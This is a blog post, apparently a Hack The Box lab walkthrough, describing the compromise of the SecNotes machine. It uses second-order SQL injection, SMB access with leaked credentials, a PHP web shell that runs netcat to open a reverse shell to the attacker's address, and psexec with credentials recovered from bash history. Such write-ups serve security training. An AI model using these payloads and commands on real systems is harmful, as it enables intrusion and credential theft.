<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - SecNotes - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for SecNotes from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - SecNotes">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/secnotes/">


  <meta property="og:description" content="My write-up / walkthrough for SecNotes from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - SecNotes">
  <meta name="twitter:description" content="My write-up / walkthrough for SecNotes from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/secnotes/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-01-19T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/secnotes/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - SecNotes">
    <meta itemprop="description" content="Hack The Box - SecNotesQuick SummaryHey guys Today SecNotes retired. SecNotes was a very nice box and I really liked that it mixed between windows and linux , and that’s because it was a windows box and it had windows subsystem for linux (WSL) installed.It was relatively easy. It’s ip is 10.10.10.97 so let’s jump right in.NmapWe will start with scanning open ports and services with nmap like we always do so nmap -sV -sT secnotes.htbAnd we see http on port 80 and microsoft-ds on 445 which is smb actually.So let’s look at what’s there on httpHTTPA regular login page and there is an option to sign up , So let’s sign up and see what’s in there.After we login we see this regular page : “Viewing Secure Notes for Username” , and there are some options like creating a note , changing password , sign out and contact. Of course we will do regular enumeration like checking for directories ,checking web vulnerabilities and stuff like that but i will just jump into the thing.SQLIIf we tried to do sql injection in the registration form , it will work after we login (second order sqli). A simple payload like OR 1 OR :And after we login we see some notes , most importantly “new site” :We got smb creds , so the next step is to login with smbclientNew SiteWe will login with smbclient :smbclient //secnotes.htb/new-site -U &quot;tyler&quot;Then we will look at the contents of that share with lssmb: \&gt; ls  .                                   D        0  Fri Jan 18 15:25:52 2019  ..                                  D        0  Fri Jan 18 15:25:52 2019  iisstart.htm                        A      696  Thu Jun 21 17:26:03 2018  iisstart.png                        A    98757  Thu Jun 21 17:26:03 2018  Microsoft                           D        0  Fri Jan 18 15:25:52 2019We see stuff that is related to an http server , but that’s not the server on port 80 , because it had more than just a png picture and html page. If we do another full port scan we will find an http server on port 8808.you can do a full scan by specifying the port range like this -p- I already know it’s port 8808 so i’m going to scan that portNow if we go to that port we will see a default page :And by looking at the source we see the png image we saw earlier on the smb share.So we can upload our shell to that server through smb then easily get a reverse shell.Reverse shell and UserWe will create a simple php file that executes nc.exe and connects back to us :&lt;?phpsystem('nc.exe -e cmd.exe 10.10.xx.xx 1337')?&gt;Then we will put it on the server : from smb shell we do put rev.php we also need nc.exe . you can get it from here then we will do put nc.exeNow when we visit secnotes.htb:8808/rev.php our listener should get a callback , and we got a rev shell !WSLLet’s take a look at the admin’s DesktopThere are some interesting stuff , but bash.lnk that’s weird because we are on a windows machine , so windows subsystem for linux is installed on this machine. Let’s find where bash.exe is.We will cd /windows then we will do dir *.exe /b/s | findstr bash and this will list recursively all the exe files then we will just pick the line that has bash in it , findstr is like grep in linuxAnd we got the path , let’s cd to it and execute bash.exeWe will get a stable shell with python pty , We see that we are root on this subsystem. if we list the files in /root directory we don’t see too much files , but we see .bash_history which is a very interesting thing to look at if you are enumerating a linux box so let’s view that.RootThere’s an smbclient command with the administrator creds, we will simply use impacket’s psexec.py to get a root shell , like we did in Active ./psexec.py administrator@secnotes.htbAnd we owned root!That’s it , Feedback is appreciated !Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3shamThanks for reading.previous Hack The Box write-up : Hack The Box - OzNext Hack The Box write-up : Hack The Box - Dab">
    <meta itemprop="datePublished" content="2019-01-19T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/secnotes/" class="u-url" itemprop="url">Hack The Box - SecNotes
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-01-19T07:00:00+02:00">January 19, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          3 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---secnotes">Hack The Box - SecNotes</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#http">HTTP</a></li>
<li><a href="#sqli">SQLI</a></li>
<li><a href="#new-site">New Site</a></li>
<li><a href="#reverse-shell-and-user">Reverse shell and User</a></li>
<li><a href="#wsl">WSL</a></li>
<li><a href="#root">Root</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---secnotes">Hack The Box - SecNotes</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys Today SecNotes retired. SecNotes was a very nice box and I really liked that it mixed between windows and linux , and that’s because it was a windows box and it had windows subsystem for linux (WSL) installed.It was relatively easy. It’s ip is 10.10.10.97 so let’s jump right in.<br>
<br><img src="/images/hackthebox/secnotes/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>We will start with scanning open ports and services with nmap like we always do so <code class="language-plaintext highlighter-rouge">nmap -sV -sT secnotes.htb</code>
<br><img src="/images/hackthebox/secnotes/1.png" alt="" class="align-center"><br><br>
And we see http on port 80 and microsoft-ds on 445 which is smb actually.<br>
So let’s look at what’s there on http</p>

<h2 id="http">HTTP</h2>
<p><br><img src="/images/hackthebox/secnotes/2.png" alt="" class="align-center"><br><br>
A regular login page and there is an option to sign up , So let’s sign up and see what’s in there.<br>
<br><img src="/images/hackthebox/secnotes/3.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/secnotes/4.png" alt="" class="align-center"><br><br>
After we login we see this regular page : “Viewing Secure Notes for <em>Username</em>” , and there are some options like creating a note , changing password , sign out and contact. Of course we will do regular enumeration like checking for directories ,checking web vulnerabilities and stuff like that but i will just jump into the thing.<br></p>

<h2 id="sqli">SQLI</h2>
<p>If we tried to do sql injection in the registration form , it will work after we login (second order sqli). A simple payload like <code class="language-plaintext highlighter-rouge">OR 1 OR</code> :
<br><img src="/images/hackthebox/secnotes/5.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/secnotes/6.png" alt="" class="align-center"><br><br>
And after we login we see some notes , most importantly “new site” :
<br><img src="/images/hackthebox/secnotes/7.png" alt="" class="align-center"><br><br>
We got smb creds , so the next step is to login with smbclient</p>

<h2 id="new-site">New Site</h2>
<p>We will login with smbclient :
<code class="language-plaintext highlighter-rouge">smbclient //secnotes.htb/new-site -U "tyler"</code>
Then we will look at the contents of that share with <code class="language-plaintext highlighter-rouge">ls</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: \&gt; ls
  .                                   D        0  Fri Jan 18 15:25:52 2019
  ..                                  D        0  Fri Jan 18 15:25:52 2019
  iisstart.htm                        A      696  Thu Jun 21 17:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 17:26:03 2018
  Microsoft                           D        0  Fri Jan 18 15:25:52 2019

</code></pre></div></div>
<p>We see stuff that is related to an http server , but that’s not the server on port 80 , because it had more than just a png picture and html page. If we do another full port scan we will find an http server on port 8808.<br>
you can do a full scan by specifying the port range like this <code class="language-plaintext highlighter-rouge">-p-</code> I already know it’s port 8808 so i’m going to scan that port
<br><img src="/images/hackthebox/secnotes/8.png" alt="" class="align-center"><br><br>
Now if we go to that port we will see a default page :
<br><img src="/images/hackthebox/secnotes/9.png" alt="" class="align-center"><br><br>
And by looking at the source we see the png image we saw earlier on the smb share.<br>
<br><img src="/images/hackthebox/secnotes/10.png" alt="" class="align-center"><br><br>
So we can upload our shell to that server through smb then easily get a reverse shell.<br></p>

<h2 id="reverse-shell-and-user">Reverse shell and User</h2>
<p>We will create a simple php file that executes nc.exe and connects back to us :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">system</span><span class="p">(</span><span class="s1">'nc.exe -e cmd.exe 10.10.xx.xx 1337'</span><span class="p">)</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>Then we will put it on the server : from smb shell we do <code class="language-plaintext highlighter-rouge">put rev.php</code> we also need nc.exe . you can get it from <a href="https://eternallybored.org/misc/netcat/" target="_blank" rel="noopener noreferrer">here</a> then we will do <code class="language-plaintext highlighter-rouge">put nc.exe</code>
<br>Now when we visit secnotes.htb:8808/rev.php our listener should get a callback , and we got a rev shell !
<br><img src="/images/hackthebox/secnotes/11.png" alt="" class="align-center"><br><br></p>

<h2 id="wsl">WSL</h2>
<p>Let’s take a look at the admin’s Desktop
<br><img src="/images/hackthebox/secnotes/12.png" alt="" class="align-center"><br><br>
There are some interesting stuff , but <code class="language-plaintext highlighter-rouge">bash.lnk</code> that’s weird because we are on a windows machine , so windows subsystem for linux is installed on this machine. Let’s find where bash.exe is.
<br>We will <code class="language-plaintext highlighter-rouge">cd /windows</code> then we will do <code class="language-plaintext highlighter-rouge">dir *.exe /b/s | findstr bash</code> and this will list recursively all the exe files then we will just pick the line that has bash in it , <code class="language-plaintext highlighter-rouge">findstr</code> is like <code class="language-plaintext highlighter-rouge">grep</code> in linux
<br><img src="/images/hackthebox/secnotes/13.png" alt="" class="align-center"><br><br>
And we got the path , let’s <code class="language-plaintext highlighter-rouge">cd</code> to it and execute bash.exe
<br><img src="/images/hackthebox/secnotes/14.png" alt="" class="align-center"><br><br>
We will get a stable shell with python pty , We see that we are root on this subsystem. if we list the files in <code class="language-plaintext highlighter-rouge">/root</code> directory we don’t see too much files , but we see <code class="language-plaintext highlighter-rouge">.bash_history</code> which is a very interesting thing to look at if you are enumerating a linux box so let’s view that.<br>
<br><img src="/images/hackthebox/secnotes/15.png" alt="" class="align-center"><br><br></p>

<h2 id="root">Root</h2>
<p>There’s an smbclient command with the administrator creds, we will simply use <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener noreferrer">impacket</a>’s <code class="language-plaintext highlighter-rouge">psexec.py</code> to get a root shell , like we did in <a href="/hack-the-box/active/">Active</a> 
<code class="language-plaintext highlighter-rouge">./psexec.py administrator@secnotes.htb</code>
<br><img src="/images/hackthebox/secnotes/16.png" alt="" class="align-center"><br><br>
And we owned root!</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>previous Hack The Box write-up : <a href="/hack-the-box/oz/">Hack The Box - Oz</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/dab/">Hack The Box - Dab</a></p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-01-19T07:00:00+02:00">January 19, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/binary-exploitation/bof5/" class="pagination--pager" title="Buffer Overflow Examples, Code execution by shellcode injection - protostar stack5
">Previous</a>
    
    
      <a href="/wizard-labs/dummy/" class="pagination--pager" title="Wizard Labs - Dummy
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
